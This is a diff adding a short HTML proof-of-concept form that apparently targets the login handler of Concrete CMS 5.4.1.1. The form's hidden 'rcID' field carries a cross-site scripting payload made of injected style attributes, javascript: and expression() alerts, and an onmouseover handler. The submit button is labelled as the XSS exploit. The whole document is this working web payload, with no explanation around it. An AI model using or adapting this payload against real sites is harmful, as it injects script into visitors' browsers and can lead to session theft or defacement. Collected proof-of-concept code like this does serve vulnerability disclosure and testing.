@@ -1,0 +1,6 @@
+&lt;form action=&quot;http://www.example.com/Concrete/index.php/login/do_login/&quot;  method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uName&quot; value=&quot;test&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uPassword&quot; value=&quot;test&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rcID&quot; value=&#039;&quot; style=display:block;color:red;width:9999;height:9999;z-index:9999;top:0;left:0;background-image:url(javascript:alert(/XSS/));width:expression(alert(/XSS/)); onmouseover=&quot;alert(/XSS/)&#039; /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Get Concrete CMS 5.4.1.1 XSS&quot; /&gt;
+&lt;/form&gt;
